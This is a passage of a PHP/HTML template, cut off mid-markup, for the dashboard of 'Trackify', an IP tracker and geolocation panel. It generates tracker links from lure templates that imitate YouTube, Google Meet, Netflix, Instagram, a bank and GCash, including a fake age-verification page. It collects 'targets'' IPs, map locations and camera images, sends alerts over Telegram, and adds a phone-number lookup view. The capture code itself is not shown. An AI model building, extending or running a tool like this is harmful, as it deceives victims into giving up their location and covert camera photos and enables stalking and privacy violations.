<?php
declare(strict_types=1);

if (!defined('TRACKIFY_PANEL')) {
    http_response_code(403);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'Forbidden';
    exit;
}

$userNavName = $userNavName ?? 'Account';
$userNavInitial = $userNavInitial ?? '?';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trackify - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0d1117;
            --bg-card: #161b22;
            --bg-input: #21262d;
            --border: #30363d;
            --text: #e6edf3;
            --text-muted: #8b949e;
            --accent: #58a6ff;
            --accent-green: #3fb950;
            --accent-yellow: #d29922;
            --accent-red: #f85149;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Space Grotesk', sans-serif;
            background: var(--bg-dark);
            color: var(--text);
            min-height: 100vh;
            background-image: radial-gradient(ellipse at top, #1a2332 0%, #0d1117 70%);
        }
        .layout {
            display: grid;
            grid-template-columns: minmax(380px, 1fr) minmax(460px, 580px) 360px;
            min-height: 100vh;
        }
        @media (max-width: 1200px) {
            .layout { grid-template-columns: 1fr 360px; }
            .gallery-section { order: 3; grid-column: 1 / -1; }
        }
        @media (max-width: 900px) {
            .layout { grid-template-columns: 1fr; }
        }
        .main {
            padding: 32px;
            overflow-y: auto;
        }
        .gallery-section {
            background: var(--bg-card);
            border-left: 1px solid var(--border);
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }
        @media (max-width: 1200px) {
            .gallery-section { border-left: none; border-top: 1px solid var(--border); }
        }
        .sidebar {
            background: var(--bg-card);
            border-left: 1px solid var(--border);
            padding: 24px;
            overflow-y: auto;
        }
        @media (max-width: 900px) {
            .sidebar { border-left: none; border-top: 1px solid var(--border); }
        }
        .gallery-header {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            gap: 10px;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
        }
        .gallery-header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
        }
        .gallery-toolbar {
            display: none;
            align-items: center;
            gap: 14px;
            flex-wrap: wrap;
        }
        .gallery-toolbar-label {
            font-size: 13px;
            color: var(--text-muted);
            display: inline-flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            user-select: none;
        }
        .gallery-btn {
            font-size: 12px;
            padding: 6px 12px;
            border-radius: 6px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text);
            cursor: pointer;
            font-family: inherit;
        }
        .gallery-btn:disabled {
            opacity: 0.45;
            cursor: not-allowed;
        }
        .gallery-btn.danger {
            border-color: var(--accent-red);
            color: var(--accent-red);
        }
        .gallery-btn.danger:not(:disabled):hover {
            background: rgba(248,81,73,0.12);
        }
        .gallery-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
        .gallery-stats {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 12px;
            align-self: start;
            width: 100%;
        }
        .gallery-item {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            border-radius: 8px;
            overflow: hidden;
            background: var(--bg-input);
            border: 1px solid var(--border);
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .gallery-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
            border-color: var(--accent);
        }
        .gallery-item:focus {
            outline: 2px solid var(--accent);
            outline-offset: 2px;
        }
        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            pointer-events: none;
            user-select: none;
        }
        .gallery-item-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 4px 6px;
            background: linear-gradient(transparent, rgba(0,0,0,0.85));
            color: rgba(255,255,255,0.9);
            font-size: 9px;
            font-family: 'JetBrains Mono', monospace;
        }
        .gallery-item-actions {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 4px;
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            z-index: 3;
            pointer-events: none;
        }
        .gallery-item-actions > * {
            pointer-events: auto;
        }
        .gallery-select-cb {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: var(--accent);
        }
        .gallery-delete-one {
            width: 26px;
            height: 26px;
            border: none;
            border-radius: 6px;
            background: rgba(248,81,73,0.92);
            color: #fff;
            font-size: 16px;
            line-height: 1;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: inherit;
            padding: 0;
        }
        .gallery-delete-one:hover {
            background: var(--accent-red);
        }
        .gallery-select-label {
            margin: 0;
            padding: 2px;
            background: rgba(0,0,0,0.35);
            border-radius: 4px;
        }
        .capture-quota-banner {
            font-size: 13px;
            line-height: 1.45;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid rgba(210,153,34,0.45);
            background: rgba(210,153,34,0.12);
            color: var(--accent-yellow);
        }
        .gallery-empty {
            grid-column: 1 / -1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 24px;
            text-align: center;
        }
        .gallery-empty-icon {
            width: 80px;
            height: 80px;
            margin-bottom: 24px;
            background: linear-gradient(135deg, rgba(88,166,255,0.2), rgba(163,113,247,0.2));
            border: 2px dashed rgba(88,166,255,0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            animation: pulse-glow 3s ease-in-out infinite;
        }
        @keyframes pulse-glow {
            0%, 100% { opacity: 1; transform: scale(1); border-color: rgba(88,166,255,0.4); }
            50% { opacity: 0.9; transform: scale(1.03); border-color: rgba(163,113,247,0.5); }
        }
        .gallery-empty-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .gallery-empty-text {
            color: var(--text-muted);
            font-size: 13px;
            max-width: 280px;
            line-height: 1.5;
        }
        .gallery-empty-hint {
            margin-top: 16px;
            font-size: 12px;
            color: var(--text-muted);
            opacity: 0.8;
        }
        .pagination {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid var(--border);
            width: 100%;
        }
        .pagination-btn {
            min-width: 40px;
            height: 40px;
            padding: 0 12px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text);
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        .pagination-btn:hover:not(:disabled) {
            border-color: var(--accent);
            background: rgba(88,166,255,0.1);
        }
        .pagination-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .pagination-info {
            font-size: 13px;
            color: var(--text-muted);
            padding: 0 16px;
        }
        .lightbox {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        .lightbox.show {
            opacity: 1;
            visibility: visible;
        }
        .lightbox img {
            max-width: 100%;
            max-height: 90vh;
            object-fit: contain;
            border-radius: 8px;
        }
        .lightbox-close {
            position: absolute;
            top: 24px;
            right: 24px;
            width: 44px;
            height: 44px;
            border: none;
            background: rgba(255,255,255,0.1);
            color: white;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .lightbox-close:hover {
            background: rgba(255,255,255,0.2);
        }
        .title-row {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            gap: 16px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .title-row h1 {
            margin-bottom: 0;
        }
        .user-nav {
            position: relative;
            flex-shrink: 0;
            z-index: 200;
        }
        .user-nav-trigger {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            font-weight: 600;
            font-family: inherit;
            color: var(--text);
            padding: 0;
            border-radius: 999px;
            border: none;
            background: transparent;
            cursor: pointer;
        }
        .user-nav-trigger:hover {
            color: #fff;
        }
        .user-nav-trigger[aria-expanded="true"] {
            border-color: var(--accent);
        }
        .user-nav-trigger[aria-expanded="true"] .user-nav-chevron {
            transform: rotate(180deg);
        }
        .user-nav-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .user-nav-name {
            max-width: 160px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        @media (max-width: 600px) {
            .user-nav-name { max-width: 100px; }
        }
        .user-nav-chevron {
            color: var(--text-muted);
            flex-shrink: 0;
            transition: transform 0.2s;
        }
        .user-nav-dropdown {
            position: absolute;
            top: calc(100% + 8px);
            right: 0;
            min-width: 212px;
            padding: 6px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 10px;
            box-shadow: 0 16px 40px rgba(0,0,0,0.45);
        }
        .user-nav-dropdown[hidden] {
            display: none !important;
        }
        .user-nav-item {
            display: block;
            padding: 10px 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text);
            text-decoration: none;
            transition: background 0.15s;
        }
        .user-nav-item:hover {
            background: var(--bg-input);
        }
        .user-nav-item--danger {
            color: var(--accent-red);
        }
        .user-nav-item--danger:hover {
            background: rgba(248, 81, 73, 0.1);
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 32px;
        }
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
        }
        .card h2 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        label {
            display: block;
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 8px;
        }
        select, input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            font-family: inherit;
            margin-bottom: 16px;
        }
        select:focus, input:focus {
            outline: none;
            border-color: var(--accent);
        }
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            height: 44px;
            padding: 0 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s;
            box-sizing: border-box;
        }
        .btn-primary {
            background: linear-gradient(135deg, #238636, #2ea043);
            color: white;
        }
        .btn-primary:hover {
            filter: brightness(1.1);
            transform: translateY(-1px);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-secondary {
            background: var(--bg-input);
            color: var(--text);
            border: 1px solid var(--border);
        }
        .btn-secondary:hover {
            background: var(--border);
        }
        .link-box {
            display: flex;
            align-items: stretch;
            gap: 12px;
            margin-top: 16px;
        }
        .link-box .btn {
            height: 44px;
            min-width: 44px;
            padding: 0 16px;
        }
        .link-input {
            flex: 1;
            height: 44px;
            padding: 0 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            box-sizing: border-box;
        }
        .terminal {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            background: #0a0e14;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            height: 400px;
            overflow-y: auto;
            color: #b3b1ad;
        }
        .terminal-line {
            margin-bottom: 4px;
            word-break: break-all;
        }
        .terminal-line.cyan { color: #39bae6; }
        .terminal-line.green { color: #7fd962; }
        .terminal-line.yellow { color: #ffb454; }
        .terminal-line.dim { color: #626a73; }
        .terminal-line.prompt { color: #ff8f40; }
        .terminal-cursor {
            display: inline-block;
            width: 8px;
            height: 16px;
            background: var(--accent);
            animation: blink 1s step-end infinite;
            vertical-align: -2px;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        .telegram-section {
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid var(--border);
        }
        .telegram-section label { margin-top: 12px; }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
        }
        .status-badge.active {
            background: rgba(63, 185, 80, 0.2);
            color: var(--accent-green);
        }
        .status-badge.inactive {
            background: rgba(248, 81, 73, 0.2);
            color: var(--accent-red);
        }
        .status-badge::before {
            content: '';
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: currentColor;
        }
        .status-badge.inactive::before { background: var(--accent-red); }
        .btn-danger {
            background: rgba(248, 81, 73, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }
        .btn-danger:hover {
            background: rgba(248, 81, 73, 0.3);
        }
        .captures-list {
            max-height: 200px;
            overflow-y: auto;
        }
        .capture-item {
            padding: 12px;
            background: var(--bg-input);
            border-radius: 8px;
            margin-bottom: 8px;
            font-size: 13px;
        }
        .capture-item .ip { color: var(--accent); font-weight: 500; }
        .capture-item .time { color: var(--text-muted); font-size: 12px; }
        .empty-state {
            color: var(--text-muted);
            text-align: center;
            padding: 32px;
            font-size: 14px;
        }
        .card-header-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 12px;
        }
        .card-header-row h2 {
            margin-bottom: 0;
        }
        .mini-btn {
            height: 30px;
            padding: 0 12px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .mini-btn:hover {
            color: var(--text);
            border-color: var(--accent);
        }
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            padding: 12px 20px;
            background: var(--accent-green);
            color: white;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s;
            z-index: 1000;
        }
        .toast.show {
            transform: translateY(0);
            opacity: 1;
        }
        .disclaimer-wrap {
            margin-bottom: 24px;
        }
        .disclaimer-link {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
            color: var(--accent);
            cursor: pointer;
            padding: 8px 16px;
            border-radius: 20px;
            background: rgba(88, 166, 255, 0.12);
            border: 1px solid rgba(88, 166, 255, 0.25);
            transition: all 0.2s ease;
        }
        .disclaimer-link:hover {
            color: #79b8ff;
            background: rgba(88, 166, 255, 0.2);
            border-color: rgba(88, 166, 255, 0.4);
        }
        .disclaimer-link svg {
            width: 14px;
            height: 14px;
            opacity: 0.8;
        }
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 3000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .modal-content {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            max-width: 480px;
            width: 100%;
            max-height: 80vh;
            overflow-y: auto;
            padding: 24px;
            transform: scale(0.95);
            transition: transform 0.3s;
        }
        .modal-overlay.show .modal-content {
            transform: scale(1);
        }
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        .modal-body {
            font-size: 14px;
            line-height: 1.6;
            color: var(--text-muted);
            margin-bottom: 24px;
        }
        .modal-body p {
            margin-bottom: 12px;
        }
        .modal-close {
            width: 100%;
            padding: 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .modal-close:hover {
            background: var(--border);
        }
        .support-float {
            position: fixed;
            right: 20px;
            bottom: 20px;
            z-index: 2600;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 10px;
        }
        .support-prompt {
            max-width: 280px;
            padding: 12px 14px;
            border-radius: 10px;
            border: 1px solid rgba(88, 166, 255, 0.35);
            background: rgba(13, 17, 23, 0.96);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
            font-size: 13px;
            line-height: 1.45;
            color: var(--text);
        }
        .support-prompt[hidden] {
            display: none !important;
        }
        .support-prompt-actions {
            margin-top: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .support-link-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            height: 34px;
            padding: 0 12px;
            border-radius: 999px;
            border: 1px solid rgba(255, 221, 87, 0.45);
            background: linear-gradient(135deg, #ffdd57, #ffbf00);
            color: #121212;
            font-size: 12px;
            font-weight: 700;
            text-decoration: none;
        }
        .support-link-btn:hover {
            filter: brightness(1.05);
        }
        .support-dismiss-btn {
            height: 34px;
            padding: 0 12px;
            border-radius: 999px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .support-dismiss-btn:hover {
            color: var(--text);
            border-color: var(--accent);
        }
        .support-fab {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            height: 48px;
            padding: 0 16px;
            border: none;
            border-radius: 999px;
            background: linear-gradient(135deg, #ffdd57, #ffbf00);
            color: #111;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 12px 24px rgba(0,0,0,0.35);
            text-decoration: none;
            transition: transform 0.18s ease, filter 0.18s ease;
        }
        .support-fab:hover {
            transform: translateY(-1px);
            filter: brightness(1.04);
        }
        @media (max-width: 680px) {
            .support-float {
                right: 12px;
                bottom: 12px;
            }
            .support-prompt {
                max-width: min(280px, calc(100vw - 24px));
            }
            .support-fab {
                font-size: 12px;
                padding: 0 14px;
            }
        }
        .phone-lookup-input-wrap {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 12px;
        }
        .phone-lookup-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
            margin-top: 4px;
        }
        .phone-lookup-results {
            margin-top: 12px;
            font-size: 13px;
        }
        .phone-lookup-terminal {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            background: #05070c;
            border-radius: 10px;
            border: 1px solid var(--border);
            padding: 16px 18px;
            max-height: 340px;
            overflow-y: auto;
            color: #b3b1ad;
        }
        .phone-lookup-terminal-line {
            margin-bottom: 4px;
            word-break: break-all;
        }
        .phone-lookup-terminal-line span.prompt {
            color: #ff8f40;
        }
        .phone-lookup-terminal-line span.link {
            color: #39bae6;
        }
        .phone-lookup-terminal-line span.hint {
            color: #626a73;
        }
        .phone-lookup-hint {
            color: var(--text-muted);
            font-size: 12px;
        }
        .app-shell {
            display: flex;
            min-height: 100vh;
        }
        .side-nav {
            width: 72px;
            background: #05070c;
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px 8px;
            gap: 12px;
        }
        .side-nav-logo {
            width: 40px;
            height: 40px;
            border-radius: 12px;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 18px;
            color: #fff;
            margin-bottom: 12px;
        }
        .side-nav-spacer {
            flex: 1;
        }
        .side-nav-item {
            width: 40px;
            height: 40px;
            border-radius: 999px;
            border: none;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            cursor: pointer;
            transition: background 0.15s, color 0.15s, transform 0.15s;
            font-size: 18px;
        }
        .side-nav-item:hover {
            color: var(--text);
            background: rgba(88, 166, 255, 0.12);
            transform: translateY(-1px);
        }
        .side-nav-item.active {
            background: #161b22;
            color: var(--accent);
        }
        .phone-layout {
            flex: 1;
            display: none;
            padding: 40px;
            overflow-y: auto;
        }
        .phone-layout-inner {
            max-width: 1680px;
            margin: 0 auto;
            width: 100%;
        }
        .phone-layout-columns {
            display: grid;
            grid-template-columns: minmax(0, 2fr) minmax(0, 1.3fr);
            gap: 28px;
            align-items: flex-start;
        }
        @media (max-width: 900px) {
            .phone-layout-columns {
                grid-template-columns: 1fr;
            }
        }
        .phone-history-title {
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .phone-history-list {
            border-radius: 10px;
            border: 1px solid var(--border);
            background: var(--bg-card);
            max-height: 260px;
            overflow-y: auto;
            font-size: 12px;
        }
        .phone-history-item {
            padding: 10px 12px;
            border-bottom: 1px solid rgba(48,54,61,0.7);
        }
        .phone-history-item:last-child {
            border-bottom: none;
        }
        .phone-history-number {
            color: var(--accent);
            font-weight: 600;
        }
        .phone-history-meta {
            color: var(--text-muted);
            margin-top: 2px;
            font-size: 11px;
        }
        .phone-history-urls {
            margin-top: 4px;
        }
        .phone-history-urls a {
            display: block;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            color: var(--accent);
            text-decoration: none;
        }
        .phone-history-urls a:hover {
            text-decoration: underline;
        }
        .top-nav {
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            border-bottom: 1px solid var(--border);
            background: linear-gradient(90deg, rgba(13,17,23,0.98), rgba(13,17,23,0.9));
        }
        .top-nav-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .top-nav-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
    </style>
</head>
<body>
    <div class="app-shell">
        <nav class="side-nav" aria-label="Main navigation">
            <div class="side-nav-logo">T</div>
            <button type="button" class="side-nav-item active" id="navItemTrackify" onclick="switchView('trackify')" title="Trackify">
                🛰
            </button>
            <button type="button" class="side-nav-item" id="navItemPhone" onclick="switchView('phone')" title="Phone Number Look Up">
                ☎
            </button>
            <div class="side-nav-spacer"></div>
        </nav>

        <div style="flex:1;display:flex;flex-direction:column;min-height:100vh;">
            <header class="top-nav">
                <div class="top-nav-left">
                    <span class="top-nav-title">Trackify</span>
                </div>
                <div class="user-nav" id="userNav">
                    <button type="button" class="user-nav-trigger" id="userNavTrigger" aria-expanded="false" aria-haspopup="true" aria-controls="userNavMenu">
                        <span class="user-nav-avatar" aria-hidden="true"><?= h($userNavInitial) ?></span>
                        <span class="user-nav-name"><?= h($userNavName) ?></span>
                        <svg class="user-nav-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
                    </button>
                    <div class="user-nav-dropdown" id="userNavMenu" role="menu" hidden>
                        <a href="account-settings.php" class="user-nav-item" role="menuitem">Account settings</a>
                        <a href="logout.php" class="user-nav-item user-nav-item--danger" role="menuitem">Log out</a>
                    </div>
                </div>
            </header>

        <div id="trackifyLayout" class="layout">
        <main class="main">
            <p class="subtitle">IP Tracker & Geolocation — Generate tracker links and monitor captures</p>
            <div class="disclaimer-wrap">
                <button class="disclaimer-link" onclick="openDisclaimer()" type="button">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
                    Disclaimer
                </button>
            </div>

            <div class="card">
                <h2>Generate Tracker Link</h2>
                <label>Template</label>
                <select id="template">
                    <option value="1">YouTube Live</option>
                    <option value="2" selected>Google Meet</option>
                    <option value="3">Sensitive (Age Verification)</option>
                    <option value="4">Netflix</option>
                    <option value="5">Instagram</option>
                    <option value="6">Bank</option>
                    <option value="7">GCash</option>
                </select>
                <div id="ytVideoIdWrap" style="display:none">
                    <label>YouTube Video ID</label>
                    <input type="text" id="ytVideoId" placeholder="dQw4w9WgXcQ" value="dQw4w9WgXcQ">
                </div>
                <div class="telegram-section">
                    <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
                        <input type="checkbox" id="useTelegram">
                        Enable Telegram notifications
                    </label>
                    <div id="telegramFields" style="display:none;margin-top:12px">
                        <label>Bot Token</label>
                        <input type="password" id="botToken" placeholder="123456:ABC...">
                        <label>Chat ID / Username</label>
                        <input type="text" id="chatId" placeholder="@username or -100123456">
                    </div>
                </div>
                <button class="btn btn-primary" id="generateBtn" onclick="generateLink()">
                    <span>Generate Link</span>
                </button>
                <div id="linkBox" class="link-box" style="display:none">
                    <input type="text" class="link-input" id="trackerLink" readonly>
                    <button class="btn btn-secondary" onclick="copyLink()">Copy</button>
                    <button class="btn btn-danger" id="stopBtn" onclick="stopService()">Stop</button>
                </div>
            </div>

            <div class="card">
                <h2>Terminal</h2>
                <div class="terminal" id="terminal">
                    <div class="terminal-line cyan">  ╔══════════════════════════════════════════════════════════════╗</div>
                    <div class="terminal-line cyan">  ║  <span class="green">████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗</span><span class="cyan">  ║</span></div>
                    <div class="terminal-line cyan">  ║  <span class="green">╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝</span><span class="cyan">  ║</span></div>
                    <div class="terminal-line cyan">  ║  <span class="green">   ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝ </span><span class="cyan">  ║</span></div>
                    <div class="terminal-line cyan">  ║  <span class="green">   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝  </span><span class="cyan">  ║</span></div>
                    <div class="terminal-line cyan">  ║  <span class="green">   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║   </span><span class="cyan">  ║</span></div>
                    <div class="terminal-line cyan">  ║  <span class="green">   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   </span><span class="cyan">  ║</span></div>
                    <div class="terminal-line cyan">  ╠══════════════════════════════════════════════════════════════╣</div>
                    <div class="terminal-line cyan">  ║  <span class="yellow">  [*] IP TRACKER // GEOLOCATION  │  root@trackify:~#</span><span class="cyan">           ║</span></div>
                    <div class="terminal-line cyan">  ╚══════════════════════════════════════════════════════════════╝</div>
                    <div class="terminal-line dim" style="margin-top:12px">  Developed by: 0Cod3</div>
                    <div class="terminal-line yellow" style="margin-top:16px">  [*] Waiting for targets, Press Ctrl + C to exit...</div>
                    <div class="terminal-line"><span class="prompt">  root@trackify:~# </span><span class="terminal-cursor"></span></div>
                </div>
            </div>
        </main>

        <section class="gallery-section">
            <div class="gallery-header">
                <div class="gallery-header-top">
                    <h2 class="gallery-title">Image Captures</h2>
                    <span id="photoCount" style="font-size:13px;color:var(--text-muted)"></span>
                </div>
                <div class="gallery-toolbar" id="galleryToolbar">
                    <label class="gallery-toolbar-label">
                        <input type="checkbox" id="gallerySelectAll" title="Select all on this page">
                        Select page
                    </label>
                    <button type="button" class="gallery-btn danger" id="galleryBulkDelete" disabled>Delete selected</button>
                </div>
                <div id="captureQuotaBanner" class="capture-quota-banner" style="display:none" role="status" aria-live="polite"></div>
            </div>
            <div id="galleryGrid" class="gallery-grid">
                <div class="gallery-empty" id="galleryEmpty">
                    <div class="gallery-empty-icon">📷</div>
                    <div class="gallery-empty-title">No captures yet</div>
                    <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
                    <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
                </div>
            </div>
            <div id="pagination" class="pagination" style="display:none">
                <button class="pagination-btn" id="prevBtn" onclick="loadPhotos(currentPage - 1)">← Prev</button>
                <span class="pagination-info" id="paginationInfo">Page 1 of 1</span>
                <button class="pagination-btn" id="nextBtn" onclick="loadPhotos(currentPage + 1)">Next →</button>
            </div>
        </section>

        <aside class="sidebar">
            <div class="card trackify-only">
                <h2>Status</h2>
                <div id="statusDisplay">
                    <span class="status-badge inactive">Tunnel inactive</span>
                </div>
                <p id="statusLink" style="margin-top:12px;font-size:12px;color:var(--text-muted);word-break:break-all"></p>
                <button class="btn btn-danger" id="stopBtnSidebar" onclick="stopService()" style="display:none;width:100%;margin-top:12px">Stop Tunnel</button>
            </div>
            <div class="card trackify-only">
                <div class="card-header-row">
                    <h2>Recent Captures</h2>
                    <button type="button" class="mini-btn" id="clearCapturesBtn" onclick="clearCaptures()">Clear Captures</button>
                </div>
                <div id="capturesList" class="captures-list">
                    <div class="empty-state">No captures yet</div>
                </div>
            </div>
            <div class="card trackify-only">
                <h2>Quick Links</h2>
                <a href="map.php" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none;margin-bottom:8px">View Map</a>
                <a href="api.php?action=captures" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none">API (JSON)</a>
            </div>
        </aside>
        </div>

        <section id="phoneLayout" class="phone-layout" aria-label="Phone number lookup view">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns">
                    <div class="card">
                        <h2>Phone Number Lookup</h2>
                        <div class="phone-lookup-input-wrap">
                            <label for="phoneLookupInput">Phone number</label>
                            <input type="text" id="phoneLookupInput" placeholder="09XXXXXXXXX or +63XXXXXXXXXX">
                        </div>
                        <div class="phone-lookup-actions">
